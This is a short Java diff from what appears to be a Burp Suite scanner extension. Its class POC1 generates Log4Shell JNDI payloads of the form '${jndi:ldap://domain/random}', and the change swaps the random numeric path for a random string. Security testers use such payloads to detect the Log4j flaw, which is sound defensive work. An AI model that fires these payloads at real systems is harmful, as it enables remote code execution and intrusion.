@@ -6,6 +6,6 @@ import burp.utils.Utils;
 public class POC1 implements IPOC {
     @Override
     public String generate(String domain) {
-        return "${jndi:ldap://" + domain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
+        return "${jndi:ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
     }
 }
